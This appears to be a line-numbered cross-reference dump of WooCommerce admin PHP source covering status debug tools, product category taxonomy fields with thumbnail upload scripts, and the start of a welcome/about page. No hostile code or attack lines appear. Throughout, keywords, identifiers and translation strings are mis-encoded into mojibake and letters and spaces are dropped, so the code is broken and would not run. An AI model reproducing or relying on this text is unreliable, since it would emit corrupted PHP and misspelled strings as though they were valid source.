['settings-updated'] ) ) {

161 
echo
 '<div cÏss="upd©ed"><p>' . 
	`__
( 'Your changes have been saved.', 'woocommerce' ) . '</p></div>';

164 
	`šşude_Úû
( 'views/html-admin-page-status-tools.php' );

165 
	}
}

172 
public
 
funùiÚ
 
	$g‘_toŞs
() {

173  
	`­¶y_f‹rs
Ğ'woocomm”û_debug_toŞs', 
	`¬¿y
(

174 'ş—r_Œªs›Ás' => 
	`¬¿y
(

175 'Çme' => 
	`__
( 'WC Transients','woocommerce'),

176 'bu‰Ú' => 
	`__
('Clearransients','woocommerce'),

177 'desc' => 
	`__
( 'Thisool will clearhe…roduct/shopransients cache.', 'woocommerce' ),

179 'ş—r_expœed_Œªs›Ás' => 
	`¬¿y
(

180 'Çme' => 
	`__
( 'Expired Transients','woocommerce'),

181 'bu‰Ú' => 
	`__
('Clearƒxpiredransients','woocommerce'),

182 'desc' => 
	`__
( 'Thisool will clear ALLƒxpiredransients from WordPress.', 'woocommerce' ),

184 '»couÁ_‹rms' => 
	`¬¿y
(

185 'Çme' => 
	`__
('Term counts','woocommerce'),

186 'bu‰Ú' => 
	`__
('Recounterms','woocommerce'),

187 'desc' => 
	`__
( 'Thisool will„ecount…roducterms - useful when changing your settings in‡ way which hides…roducts fromhe catalog.', 'woocommerce' ),

189 '»£t_rŞes' => 
	`¬¿y
(

190 'Çme' => 
	`__
('Capabilities','woocommerce'),

191 'bu‰Ú' => 
	`__
('Reset capabilities','woocommerce'),

192 'desc' => 
	`__
( 'Thisool will„esethe‡dmin, customer‡nd shop_manager„oleso default. Usehis if your users cannot‡ccess‡ll ofhe WooCommerce‡dmin…ages.', 'woocommerce' ),

194 'ş—r_£ssiÚs' => 
	`¬¿y
(

195 'Çme' => 
	`__
('Customer Sessions','woocommerce'),

196 'bu‰Ú' => 
	`__
('Clear‡ll sessions','woocommerce'),

197 'desc' => 
	`__
( '<strong class="red">Warning:</strong> Thisool will delete‡ll customer session data fromhe database, including‡ny current†ive carts.', 'woocommerce' ),

199 'š¡®l_·ges' => 
	`¬¿y
(

200 'Çme' => 
	`__
( 'Install WooCommerce Pages', 'woocommerce' ),

201 'bu‰Ú' => 
	`__
( 'Install…ages', 'woocommerce' ),

202 'desc' => 
	`__
( '<strong class="red">Note:</strong> Thisool will install‡llhe missing WooCommerce…ages. Pages‡lready defined‡nd set up will‚ot be„eplaced.', 'woocommerce' ),

204 'd–‘e_xes' => 
	`¬¿y
(

205 'Çme' => 
	`__
( 'Delete‡ll WooCommerceax„ates', 'woocommerce' ),

206 'bu‰Ú' => 
	`__
( 'Delete ALLax„ates', 'woocommerce' ),

207 'desc' => 
	`__
( '<strong class="red">Note:</strong> This option will delete ALL of yourax„ates, use with caution.', 'woocommerce' ),

210 
	}
}

219 
public
 
funùiÚ
 
	$g‘_fe_v”siÚ
Ğ
$fe
 ) {

221 
$å
 = 
	`fİ’
Ğ
$fe
, 'r' );

224 
$fe_d©a
 = 
	`ä—d
Ğ
$å
, 8192 );

227 
	`fşo£
Ğ
$å
 );

230 
$fe_d©a
 = 
	`¡r_»¶aû
( "\r", "\n", $file_data );

231 
$v”siÚ
 = '';

233 iàĞ
	`´eg_m©ch
Ğ'/^[ \t\/*#@]*' . 
	`´eg_quÙe
Ğ'@v”siÚ', '/' ) . '(.*)$/mi', 
$fe_d©a
, 
$m©ch
 ) && $match[1] )

234 
$v”siÚ
 = 
	`_ş—nup_h—d”_comm’t
Ğ
$m©ch
[1] );

236  
$v”siÚ
 ;

237 
	}
}

246 
public
 
funùiÚ
 
	$sÿn_‹m¶©e_fes
Ğ
$‹m¶©e_·th
 ) {

247 
$fes
 = 
	`sÿndœ
Ğ
$‹m¶©e_·th
 );

248 
$»suÉ
 = 
	`¬¿y
();

249 iàĞ
$fes
 ) {

250 
	`fÜ—ch
 ( 
$fes
 
as
 
$key
 => 
$v®ue
 ) {

251 iàĞ! 
	`š_¬¿y
Ğ
$v®ue
, 
	`¬¿y
( ".",".." ) ) ) {

252 iàĞ
	`is_dœ
Ğ
$‹m¶©e_·th
 . 
DIRECTORY_SEPARATOR
 . 
$v®ue
 ) ) {

253 
$sub_fes
 = 
$this
->
	`sÿn_‹m¶©e_fes
Ğ
$‹m¶©e_·th
 . 
DIRECTORY_SEPARATOR
 . 
$v®ue
 );

254 
	`fÜ—ch
 ( 
$sub_fes
 
as
 
$sub_fe
 ) {

255 
$»suÉ
[] = 
$v®ue
 . 
DIRECTORY_SEPARATOR
 . 
$sub_fe
;

258 
$»suÉ
[] = 
$v®ue
;

263  
$»suÉ
;

264 
	}
}

267 
	g’dif
;

269  
Ãw
 
WC_Admš_Stus
();

	@includes/admin/class-wc-admin-taxonomies.php

1 <?
php


2 iàĞ! 
defšed
( 'ABSPATH' ) ) {

3 
	gex™
;

15 şas 
	cWC_Admš_TaxÚom›s
 {

20 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

23 
	`add_aùiÚ
Ğ"ü—‹_‹rm", 
	`¬¿y
Ğ
$this
, 'create_term' ), 5, 3 );

24 
	`add_aùiÚ
Ğ"d–‘e_‹rm", 
	`¬¿y
Ğ
$this
, 'delete_term' ), 5 );

27 
	`add_aùiÚ
Ğ'´oduù_ÿt_add_fÜm_f›lds', 
	`¬¿y
Ğ
$this
, 'add_category_fields' ) );

28 
	`add_aùiÚ
Ğ'´oduù_ÿt_ed™_fÜm_f›lds', 
	`¬¿y
Ğ
$this
, 'edit_category_fields' ), 10, 2 );

29 
	`add_aùiÚ
Ğ'ü—‹d_‹rm', 
	`¬¿y
Ğ
$this
, 'save_category_fields' ), 10, 3 );

30 
	`add_aùiÚ
Ğ'ed™_‹rm', 
	`¬¿y
Ğ
$this
, 'save_category_fields' ), 10, 3 );

33 
	`add_f‹r
Ğ'mªage_ed™-´oduù_ÿt_cŞumns', 
	`¬¿y
Ğ
$this
, 'product_cat_columns' ) );

34 
	`add_f‹r
Ğ'mªage_´oduù_ÿt_cu¡om_cŞumn', 
	`¬¿y
Ğ
$this
, 'product_cat_column' ), 10, 3 );

37 
	`add_aùiÚ
Ğ'´oduù_ÿt_´e_add_fÜm', 
	`¬¿y
Ğ
$this
, 'product_cat_description' ) );

38 
	`add_aùiÚ
Ğ'´oduù_shpšg_şass_´e_add_fÜm', 
	`¬¿y
Ğ
$this
, 'shipping_class_description' ) );

50 
public
 
funùiÚ
 
	`ü—‹_‹rm
Ğ
$‹rm_id
, 
$‰_id
 = '', 
$xÚomy
 = '' ) {

51 iàĞ
$xÚomy
 !ğ'´oduù_ÿt' && ! 
	`xÚomy_is_´oduù_©Œibu‹
( $taxonomy ) )

54 
$m‘a_Çme
 = 
	`xÚomy_is_´oduù_©Œibu‹
Ğ
$xÚomy
 ) ? 'Üd”_' . 
	`esc_©Œ
( $taxonomy ) : 'order';

56 
	`upd©e_woocomm”û_‹rm_m‘a
Ğ
$‹rm_id
, 
$m‘a_Çme
, 0 );

57 
	}
}

66 
public
 
funùiÚ
 
	$d–‘e_‹rm
Ğ
$‹rm_id
 ) {

68 
$‹rm_id
 = () $term_id;

70 iàĞ! 
$‹rm_id
 )

73 
glob®
 
$wpdb
;

74 
$wpdb
->
	`qu”y
Ğ"DELETE FROM {$wpdb->woocomm”û_‹rmm‘a} WHERE `woocomm”û_‹rm_id` = " . 
$‹rm_id
 );

75 
	}
}

83 
public
 
funùiÚ
 
	$add_ÿ‹gÜy_f›lds
() {

85 <
div
 
şass
="form-field">

86 <
Ïb–
 ="di¥Ïy_ty³"><?
php
 
	`_e
( 'Displayype', 'woocommerce' ); ?></label>

87 <
£Ëù
 
id
="di¥Ïy_ty³" 
Çme
="di¥Ïy_ty³" 
şass
="postform">

88 <
İtiÚ
 
v®ue
=""><?
php
 
	`_e
( 'Default', 'woocommerce' ); ?></option>

89 <
İtiÚ
 
v®ue
="´oduùs"><?
php
 
	`_e
( 'Products', 'woocommerce' ); ?></option>

90 <
İtiÚ
 
v®ue
="subÿ‹gÜ›s"><?
php
 
	`_e
( 'Subcategories', 'woocommerce' ); ?></option>

91 <
İtiÚ
 
v®ue
="bÙh"><?
php
 
	`_e
( 'Both', 'woocommerce' ); ?></option>

92 </
£Ëù
>

93 </
div
>

94 <
div
 
şass
="form-field">

95 <
Ïb–
><?
php
 
	`_e
( 'Thumbnail', 'woocommerce' ); ?></label>

96 <
div
 
id
="´oduù_ÿt_thumbÇ" 
¡yË
="æßt:Ëá;m¬gš-right:10px;"><
img
 
¤c
="<?ph°echØwc_¶aûhŞd”_img_¤c(); ?>" 
width
="60px" 
height
="60px" /></div>

97 <
div
 
¡yË
="line-height:60px;">

98 <
šput
 
ty³
="hidd’" 
id
="´oduù_ÿt_thumbÇ_id" 
Çme
="product_cat_thumbnail_id" />

99 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="u¶ßd_image_bu‰Ú bu‰Ú"><?
php
 
	`_e
( 'Upload/Add image', 'woocommerce' ); ?></button>

100 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="»move_image_bu‰Ú bu‰Ú"><?
php
 
	`_e
( 'Remove image', 'woocommerce' ); ?></button>

101 </
div
>

102 <
süt
 
ty³
="text/javascript">

105 iàĞ! 
	`jQu”y
('#´oduù_ÿt_thumbÇ_id').
	`v®
() )

106 
	`jQu”y
('.»move_image_bu‰Ú').
	`hide
();

109 
v¬
 
fe_äame
;

111 
	`jQu”y
(
docum’t
).
	`Ú
Ğ'şick', '.u¶ßd_image_bu‰Ú', 
	`funùiÚ
Ğ
ev’t
 ){

113 
ev’t
.
	`´ev’tDeçuÉ
();

116 iàĞ
fe_äame
 ) {

117 
fe_äame
.
	`İ’
();

122 
fe_äame
 = 
wp
.
medŸ
.
äames
.
dowÆßdabË_fe
 = wp.
	`medŸ
({

123 
t™Ë
: '<?ph°_eĞ'
Choo£
 
ª
 
image
', '
woocomm”û
' ); ?>',

124 
bu‰Ú
: {

125 
‹xt
: '<?ph°_eĞ'
U£
 
image
', '
woocomm”û
' ); ?>',

127 
muÉË
: 
çl£


131 
fe_äame
.
	`Ú
Ğ'£Ëù', 
	`funùiÚ
() {

132 
©chm’t
 = 
fe_äame
.
	`¡©e
().
	`g‘
('£ËùiÚ').
	`fœ¡
().
	`toJSON
();

134 
	`jQu”y
('#´oduù_ÿt_thumbÇ_id').
	`v®
Ğ
©chm’t
.
id
 );

135 
	`jQu”y
('#´oduù_ÿt_thumbÇ img').
	`©Œ
('¤c', 
©chm’t
.
u¾
 );

136 
	`jQu”y
('.»move_image_bu‰Ú').
	`show
();

140 
fe_äame
.
	`İ’
();

143 
	`jQu”y
(
docum’t
).
	`Ú
Ğ'şick', '.»move_image_bu‰Ú', 
	`funùiÚ
Ğ
ev’t
 ){

144 
	`jQu”y
('#´oduù_ÿt_thumbÇ img').
	`©Œ
('src', '<?phpƒcho wc_placeholder_img_src(); ?>');

145 
	`jQu”y
('#´oduù_ÿt_thumbÇ_id').
	`v®
('');

146 
	`jQu”y
('.»move_image_bu‰Ú').
	`hide
();

147  
çl£
;

150 </
süt
>

151 <
div
 
şass
="clear"></div>

152 </
div
>

153 <?
php


154 
	}
}

163 
public
 
funùiÚ
 
	$ed™_ÿ‹gÜy_f›lds
Ğ
$‹rm
, 
$xÚomy
 ) {

165 
$di¥Ïy_ty³
 = 
	`g‘_woocomm”û_‹rm_m‘a
Ğ
$‹rm
->
‹rm_id
, 'di¥Ïy_ty³', 
Œue
 );

166 
$image
 = '';

167 
$thumbÇ_id
 = 
	`absšt
Ğ
	`g‘_woocomm”û_‹rm_m‘a
Ğ
$‹rm
->
‹rm_id
, 'thumbÇ_id', 
Œue
 ) );

168 iàĞ
$thumbÇ_id
 )

169 
$image
 = 
	`wp_g‘_©chm’t_thumb_u¾
Ğ
$thumbÇ_id
 );

171 
$image
 = 
	`wc_¶aûhŞd”_img_¤c
();

173 <
Œ
 
şass
="form-field">

174 <
th
 
scİe
="row" 
v®ign
="tİ"><
Ïb–
><?
php
 
	`_e
( 'Displayype', 'woocommerce' ); ?></label></th>

175 <
td
>

176 <
£Ëù
 
id
="di¥Ïy_ty³" 
Çme
="di¥Ïy_ty³" 
şass
="postform">

177 <
İtiÚ
 
v®ue
="" <?
php
 
	`£Ëùed
Ğ'', 
$di¥Ïy_ty³
 ); ?>><?ph°
	`_e
( 'Default', 'woocommerce' ); ?></option>

178 <
İtiÚ
 
v®ue
="´oduùs" <?
php
 
	`£Ëùed
Ğ'´oduùs', 
$di¥Ïy_ty³
 ); ?>><?ph°
	`_e
( 'Products', 'woocommerce' ); ?></option>

179 <
İtiÚ
 
v®ue
="subÿ‹gÜ›s" <?
php
 
	`£Ëùed
Ğ'subÿ‹gÜ›s', 
$di¥Ïy_ty³
 ); ?>><?ph°
	`_e
( 'Subcategories', 'woocommerce' ); ?></option>

180 <
İtiÚ
 
v®ue
="bÙh" <?
php
 
	`£Ëùed
Ğ'bÙh', 
$di¥Ïy_ty³
 ); ?>><?ph°
	`_e
( 'Both', 'woocommerce' ); ?></option>

181 </
£Ëù
>

182 </
td
>

183 </
Œ
>

184 <
Œ
 
şass
="form-field">

185 <
th
 
scİe
="row" 
v®ign
="tİ"><
Ïb–
><?
php
 
	`_e
( 'Thumbnail', 'woocommerce' ); ?></label></th>

186 <
td
>

187 <
div
 
id
="´oduù_ÿt_thumbÇ" 
¡yË
="æßt:Ëá;m¬gš-right:10px;"><
img
 
¤c
="<?ph°echØ$image; ?>" 
width
="60px" 
height
="60px" /></div>

188 <
div
 
¡yË
="line-height:60px;">

189 <
šput
 
ty³
="hidd’" 
id
="´oduù_ÿt_thumbÇ_id" 
Çme
="´oduù_ÿt_thumbÇ_id" 
v®ue
="<?phpƒcho $thumbnail_id; ?>" />

190 <
bu‰Ú
 
ty³
="subm™" 
şass
="u¶ßd_image_bu‰Ú bu‰Ú"><?
php
 
	`_e
( 'Upload/Add image', 'woocommerce' ); ?></button>

191 <
bu‰Ú
 
ty³
="subm™" 
şass
="»move_image_bu‰Ú bu‰Ú"><?
php
 
	`_e
( 'Remove image', 'woocommerce' ); ?></button>

192 </
div
>

193 <
süt
 
ty³
="text/javascript">

196 
v¬
 
fe_äame
;

198 
	`jQu”y
(
docum’t
).
	`Ú
Ğ'şick', '.u¶ßd_image_bu‰Ú', 
	`funùiÚ
Ğ
ev’t
 ){

200 
ev’t
.
	`´ev’tDeçuÉ
();

203 iàĞ
fe_äame
 ) {

204 
fe_äame
.
	`İ’
();

209 
fe_äame
 = 
wp
.
medŸ
.
äames
.
dowÆßdabË_fe
 = wp.
	`medŸ
({

210 
t™Ë
: '<?ph°_eĞ'
Choo£
 
ª
 
image
', '
woocomm”û
' ); ?>',

211 
bu‰Ú
: {

212 
‹xt
: '<?ph°_eĞ'
U£
 
image
', '
woocomm”û
' ); ?>',

214 
muÉË
: 
çl£


218 
fe_äame
.
	`Ú
Ğ'£Ëù', 
	`funùiÚ
() {

219 
©chm’t
 = 
fe_äame
.
	`¡©e
().
	`g‘
('£ËùiÚ').
	`fœ¡
().
	`toJSON
();

221 
	`jQu”y
('#´oduù_ÿt_thumbÇ_id').
	`v®
Ğ
©chm’t
.
id
 );

222 
	`jQu”y
('#´oduù_ÿt_thumbÇ img').
	`©Œ
('¤c', 
©chm’t
.
u¾
 );

223 
	`jQu”y
('.»move_image_bu‰Ú').
	`show
();

227 
fe_äame
.
	`İ’
();

230 
	`jQu”y
(
docum’t
).
	`Ú
Ğ'şick', '.»move_image_bu‰Ú', 
	`funùiÚ
Ğ
ev’t
 ){

231 
	`jQu”y
('#´oduù_ÿt_thumbÇ img').
	`©Œ
('src', '<?phpƒcho wc_placeholder_img_src(); ?>');

232 
	`jQu”y
('#´oduù_ÿt_thumbÇ_id').
	`v®
('');

233 
	`jQu”y
('.»move_image_bu‰Ú').
	`hide
();

234  
çl£
;

237 </
süt
>

238 <
div
 
şass
="clear"></div>

239 </
td
>

240 </
Œ
>

241 <?
php


242 
	}
}

253 
public
 
funùiÚ
 
	$§ve_ÿ‹gÜy_f›lds
Ğ
$‹rm_id
, 
$‰_id
, 
$xÚomy
 ) {

254 iàĞ
	`is£t
Ğ
$_POST
['display_type'] ) )

255 
	`upd©e_woocomm”û_‹rm_m‘a
Ğ
$‹rm_id
, 'di¥Ïy_ty³', 
	`esc_©Œ
Ğ
$_POST
['display_type'] ) );

257 iàĞ
	`is£t
Ğ
$_POST
['product_cat_thumbnail_id'] ) )

258 
	`upd©e_woocomm”û_‹rm_m‘a
Ğ
$‹rm_id
, 'thumbÇ_id', 
	`absšt
Ğ
$_POST
['product_cat_thumbnail_id'] ) );

260 
	`d–‘e_Œªs›Á
( 'wc_term_counts' );

261 
	}
}

269 
public
 
funùiÚ
 
	$´oduù_ÿt_desütiÚ
() {

270 
echo
 
	`w·utİ
Ğ
	`__
( 'Product categories for your store can be managed here. To changehe order of categories onhe front-end you can drag‡nd dropo sorthem. To see more categories†isted clickhe "screen options"†ink‡theop ofhe…age.', 'woocommerce' ) );

271 
	}
}

279 
public
 
funùiÚ
 
	$shpšg_şass_desütiÚ
() {

280 
echo
 
	`w·utİ
Ğ
	`__
( 'Shipping classes can be usedo group…roducts of similarype. These groups canhen be used by certain shipping methodso…rovide different„ateso different…roducts.', 'woocommerce' ) );

281 
	}
}

290 
public
 
funùiÚ
 
	$´oduù_ÿt_cŞumns
Ğ
$cŞumns
 ) {

291 
$Ãw_cŞumns
 = 
	`¬¿y
();

292 
$Ãw_cŞumns
['cb'] = 
$cŞumns
['cb'];

293 
$Ãw_cŞumns
['thumb'] = 
	`__
( 'Image', 'woocommerce' );

295 
	`un£t
Ğ
$cŞumns
['cb'] );

297  
	`¬¿y_m”ge
Ğ
$Ãw_cŞumns
, 
$cŞumns
 );

298 
	}
}

309 
public
 
funùiÚ
 
	$´oduù_ÿt_cŞumn
Ğ
$cŞumns
, 
$cŞumn
, 
$id
 ) {

311 iàĞ
$cŞumn
 == 'thumb' ) {

313 
$image
 = '';

314 
$thumbÇ_id
 = 
	`g‘_woocomm”û_‹rm_m‘a
Ğ
$id
, 'thumbÇ_id', 
Œue
 );

316 ià(
$thumbÇ_id
)

317 
$image
 = 
	`wp_g‘_©chm’t_thumb_u¾
Ğ
$thumbÇ_id
 );

319 
$image
 = 
	`wc_¶aûhŞd”_img_¤c
();

323 
$image
 = 
	`¡r_»¶aû
( ' ', '%20', $image );

325 
$cŞumns
 .ğ'<img src="' . 
	`esc_u¾
Ğ
$image
 ) . '"‡lt="Thumbnail" class="wp-post-image" height="48" width="48" />';

329  
$cŞumns
;

330 
	}
}

333 
Ãw
 
WC_Admš_TaxÚom›s
();

	@includes/admin/class-wc-admin-welcome.php

1 <?
php


15 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

20 şas 
	cWC_Admš_W–come
 {

22 
´iv©e
 
	m$¶ugš
;

30 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

31 
$this
->
¶ugš
 = 'woocommerce/woocommerce.php';

33 
	`add_aùiÚ
Ğ'admš_m’u', 
	`¬¿y
Ğ
$this
, 'admin_menus') );

34 
	`add_aùiÚ
Ğ'admš_h—d', 
	`¬¿y
Ğ
$this
, 'admin_head' ) );

35 
	`add_aùiÚ
Ğ'admš_š™', 
	`¬¿y
Ğ
$this
, 'welcome' ) );

44 
public
 
funùiÚ
 
	$admš_m’us
() {

45 iàĞ
	`em±y
Ğ
$_GET
['page'] ) ) {

49 
$w–come_·ge_Çme
 = 
	`__
( 'About WooCommerce', 'woocommerce' );

50 
$w–come_·ge_t™Ë
 = 
	`__
( 'Welcomeo WooCommerce', 'woocommerce' );

52  
$_GET
['page'] ) {

54 
$·ge
 = 
	`add_dashbßrd_·ge
Ğ
$w–come_·ge_t™Ë
, 
$w–come_·ge_Çme
, 'mªage_İtiÚs', 'wc-about', 
	`¬¿y
Ğ
$this
, 'about_screen' ) );

55 
	`add_aùiÚ
Ğ'admš_´št_¡yËs-'. 
$·ge
, 
	`¬¿y
Ğ
$this
, 'admin_css' ) );

58 
$·ge
 = 
	`add_dashbßrd_·ge
Ğ
$w–come_·ge_t™Ë
, 
$w–come_·ge_Çme
, 'mªage_İtiÚs', 'wc-üed™s', 
	`¬¿y
Ğ
$this
, 'credits_screen' ) );

59 
	`add_aùiÚ
Ğ'admš_´št_¡yËs-'. 
$·ge
, 
	`¬¿y
Ğ
$this
, 'admin_css' ) );

62 
$·ge
 = 
	`add_dashbßrd_·ge
Ğ
$w–come_·ge_t™Ë
, 
$w–come_·ge_Çme
, 'mªage_İtiÚs', 'wc-Œª¦©Üs', 
	`¬¿y
Ğ
$this
, 'translators_screen' ) );

63 
	`add_aùiÚ
Ğ'admš_´št_¡yËs-'. 
$·ge
, 
	`¬¿y
Ğ
$this
, 'admin_css' ) );

66 
	}
}

74 
public
 
funùiÚ
 
	$admš_css
() {

75 
	`wp_’queue_¡yË
Ğ'woocomm”û-aùiv©iÚ', 
	`¶ugšs_u¾
Ğ'/as£ts/css/aùiv©iÚ.css', 
WC_PLUGIN_FILE
 ), 
	`¬¿y
(), 
WC_VERSION
 );

76 
	}
}

84 
public
 
funùiÚ
 
	$admš_h—d
() {

85 
	`»move_subm’u_·ge
( 'index.php', 'wc-about' );

86 
	`»move_subm’u_·ge
( 'index.php', 'wc-credits' );

87 
	`»move_subm’u_·ge
( 'index.php', 'wc-translators' );

90 
$badge_u¾
 = 
	`WC
()->
	`¶ugš_u¾
() . '/assets/images/welcome/wc-badge.png';

92 <
¡yË
 
ty³
="text/css">

94 .
wc
-
badge
:
befÜe
 {

95 
fÚt
-
çmy
: 
WooComm”û
 !
impÜÁ
;

96 
cÚ‹Á
: "\e03d";

97 
cŞÜ
: #fff;

98 -
webk™
-
fÚt
-
smoÙhšg
: 
ªtŸlŸ£d
;

99 -
moz
-
osx
-
fÚt
-
smoÙhšg
: 
g¿ysÿË
;

100 
fÚt
-
size
: 80
px
;

101 
fÚt
-
weight
: 
nÜm®
;

102 
width
: 165
px
;

103 
height
: 165
px
;

104 
lše
-
height
: 165
px
;

105 
‹xt
-
®ign
: 
ûÁ”
;

106 
pos™iÚ
: 
absŞu‹
;

107 
tİ
: 0;

108 
Ëá
: 0;

109 
m¬gš
: 0;

110 
v”tiÿl
-
®ign
: 
middË
;

112 .
wc
-
badge
 {

113 
pos™iÚ
: 
»Ïtive
;;

114 
background
: #9
c5d90
;

115 
‹xt
-
»nd”šg
: 
İtimizeLegib™y
;

116 
·ddšg
-
tİ
: 150
px
;

117 
height
: 52
px
;

118 
width
: 165
px
;

119 
fÚt
-
weight
: 600;

120 
fÚt
-
size
: 14
px
;

121 
‹xt
-
®ign
: 
ûÁ”
;

122 
cŞÜ
: #ddc8d9;

123 
m¬gš
: 5
px
 0 0 0;

124 -
webk™
-
box
-
shadow
: 0 1
px
 3px 
	`rgba
(0,0,0,.2);

125 
box
-
shadow
: 0 1
px
 3px 
	`rgba
(0,0,0,.2);

127 .
about
-
w¿p
 .
wc
-
badge
 {

128 
pos™iÚ
: 
absŞu‹
;

129 
tİ
: 0;

130 
right
: 0;

132 .
about
-
w¿p
 .
wc
-
ã©u»
 {

133 
ov”æow
: 
visibË
 !
impÜÁ
;

134 *
zoom
:1;

136 .
about
-
w¿p
 .
wc
-
ã©u»
:
befÜe
,

137 .
about
-
w¿p
 .
wc
-
ã©u»
:
aá”
 {

138 
cÚ‹Á
: " ";

139 
di¥Ïy
: 
bË
;

141 .
about
-
w¿p
 .
wc
-
ã©u»
:
aá”
 {

142 
ş—r
: 
bÙh
;

144 .
about
-
w¿p
 .
ã©u»
-
»¡
 
div
 {

145 
width
: 50% !
impÜÁ
;

146 
·ddšg
-
right
: 100
px
;

147 -
moz
-
box
-
sizšg
: 
bÜd”
-box;

148 
box
-
sizšg
: 
bÜd”
-box;

149 
m¬gš
: 0 !
impÜÁ
;

151 .
about
-
w¿p
 .
ã©u»
-
»¡
 
div
.
Ï¡
-feature {

152 
·ddšg
-
Ëá
: 100
px
;

153 
·ddšg
-
right
: 0;

155 .
about
-
w¿p
 
div
.
icÚ
 {

156 
width
: 0 !
impÜÁ
;

157 
·ddšg
: 0;

158 
m¬gš
: 0;

160 .
about
-
w¿p
 .
ã©u»
-
»¡
 
div
.
icÚ
:
befÜe
 {

161 
fÚt
-
çmy
: 
WooComm”û
 !
impÜÁ
;

162 
fÚt
-
weight
: 
nÜm®
;

163 
width
: 100%;

164 
fÚt
-
size
: 170
px
;

165 
lše
-
height
: 125
px
;

166 
cŞÜ
: #9
c5d90
;

167 
di¥Ïy
: 
šlše
-
block
;

168 
pos™iÚ
: 
»Ïtive
;

169 
‹xt
-
®ign
: 
ûÁ”
;

170 
¥—k
: 
nÚe
;

171 
m¬gš
: 0 0 0 -100
px
;

172 
cÚ‹Á
: "\e01d";

173 -
webk™
-
fÚt
-
smoÙhšg
: 
ªtŸlŸ£d
;

174 -
moz
-
osx
-
fÚt
-
smoÙhšg
: 
g¿ysÿË
;

176 .
about
-
š‹g¿tiÚs
 {

177 
background
: #fff;

178 
m¬gš
: 20
px
 0;

179 
·ddšg
: 1
px
 20px 10px;

182 </
¡yË
>

183 <?
php


184 
	}
}

192 
´iv©e
 
funùiÚ
 
	$šŒo
() {

195 iàĞ! 
	`em±y
Ğ
$_GET
['wc-updated'] ) || !ƒmpty( $_GET['wc-installed'] ) )

196 
	`æush_»wr™e_ruËs
();

199 
$majÜ_v”siÚ
 = 
	`sub¡r
Ğ
	`WC
()->
v”siÚ
, 0, 3 );

201 <
h1
><?
php
 
	`´štf
Ğ
	`__
Ğ'W–comtØWooComm”û %s', 'woocomm”û' ), 
$majÜ_v”siÚ
 ); ?></h1>

203 <
div
 
şass
="about-text woocommerce-about-text">

204 <?
php


205 iàĞ! 
	`em±y
Ğ
$_GET
['wc-installed'] ) )

206 
$mes§ge
 = 
	`__
( 'Thanks,‡ll done!', 'woocommerce' );

207 
	`–£if
 ( ! 
	`em±y
Ğ
$_GET
['wc-updated'] ) )

208 
$mes§ge
 = 
	`__
( 'Thank you for updatingohe†atest version!', 'woocommerce' );

210 
$mes§ge
 = 
	`__
( 'Thanks for installing!', 'woocommerce' );

212 
	`´štf
Ğ
	`__
Ğ'% WooComm”û % i mÜpow”ful, sbË,‡nd secu»hªƒv” befÜe. Whİyouƒnjoy it.', 'woocomm”û' ), 
$mes§ge
, 
$majÜ_v”siÚ
 );

214 </
div
>

216 <
div
 
şass
="wc-badge"><?
php
 
	`´štf
Ğ
	`__
Ğ'V”siÚ %s', 'woocomm”û' ), 
	`WC
()->
v”siÚ
 ); ?></div>

218 <
p
 
şass
="woocommerce-actions">

219 <
a
 
h»f
="<?ph°echØadmš_u¾('admš.php?·ge=wc-£‰šgs'); ?>" 
şass
="bu‰Ú bu‰Ú-´im¬y"><?
php
 
	`_e
( 'Settings', 'woocommerce' ); ?></a>

220 <
a
 
şass
="doc bu‰Ú bu‰Ú-´im¬y" 
h»f
="<?ph°echØesc_u¾Ğ­¶y_f‹rsĞ'woocomm”û_docs_u¾', 'h‰p://docs.woÙhemes.com/docum’tiÚ/¶ugšs/woocomm”û/', 'woocomm”û' ) ); ?>"><?
php
 
	`_e
( 'Docs', 'woocommerce' ); ?></a>

221 <
a
 
h»f
="h‰ps://tw™‹r.com/sh¬e" 
şass
="tw™‹r-sh¬e-bu‰Ú" 
d©a
-
u¾
="h‰p://www.woÙhemes.com/woocomm”û/" d©a-
‹xt
="A o³n-sourû (ä“è#ecomm”û…lugš fÜ #WÜdP»s th© h–p you s–Èªythšg. B—utifuÎy." d©a-
vŸ
="WooThemes" d©a-
size
="Ïrge" d©a-
hashgs
="WooComm”û">
Tw“t
</a>

222 <
süt
>!
	`funùiÚ
(
d
,
s
,
id
){
v¬
 
js
,
fjs
=d.
	`g‘EËm’tsByTagName
(s)[0];if(!d.
	`g‘EËm’tById
(id)){js=d.
	`ü—‹EËm’t
(s);js.id=id;js.
¤c
="//¶©fÜm.tw™‹r.com/widg‘s.js";fjs.
·»ÁNode
.
	`š£¹BefÜe
(js,fjs);}}(
docum’t
,"script","twitter-wjs");</script>

223 </
p
>

225 <
h2
 
şass
="nav-tab-wrapper">

226 <
a
 
şass
="Çv-b <?ph°iàĞ$_GET['·ge'] =ğ'wc-about' )ƒchØ'Çv-b-aùive'; ?>" 
h»f
="<?phpƒchoƒsc_url(‡dmin_url(‡dd_query_arg(‡rray( 'page' => 'wc-about' ), 'index.php' ) ) ); ?>">

227 <?
php
 
	`_e
( "What's New", 'woocommerce' ); ?>

228 </
a
><¨
şass
="Çv-b <?ph°iàĞ$_GET['·ge'] =ğ'wc-üed™s' )ƒchØ'Çv-b-aùive'; ?>" 
h»f
="<?phpƒchoƒsc_url(‡dmin_url(‡dd_query_arg(‡rray( 'page' => 'wc-credits' ), 'index.php' ) ) ); ?>">

229 <?
php
 
	`_e
( 'Credits', 'woocommerce' ); ?>

230 </
a
><¨
şass
="Çv-b <?ph°iàĞ$_GET['·ge'] =ğ'wc-Œª¦©Üs' )ƒchØ'Çv-b-aùive'; ?>" 
h»f
="<?phpƒchoƒsc_url(‡dmin_url(‡dd_query_arg(‡rray( 'page' => 'wc-translators' ), 'index.php' ) ) ); ?>">

231 <?
php
 
	`_e
( 'Translators', 'woocommerce' ); ?>

232 </
a
>

233 </
h2
>

234 <?
php


235 
	}
}

240 
public
 
funùiÚ
 
	$about_sü“n
() {

242 <
div
 
şass
="wrap‡bout-wrap">

244 <?
php
 
$this
->
	`šŒo
(); ?>

246 <!--<
div
 
şass
="changelog…oint-releases"></div>-->

248 <
div
 
şass
="changelog">

249 <
h3
><?
php
 
	`_e
( 'A‚ew RESTful API developers will &#10084;', 'woocommerce' ); ?></h3>

250 <
div
 
şass
="wc-feature feature-rest feature-section colhree-col">

251 <
div
>

252 <
h4
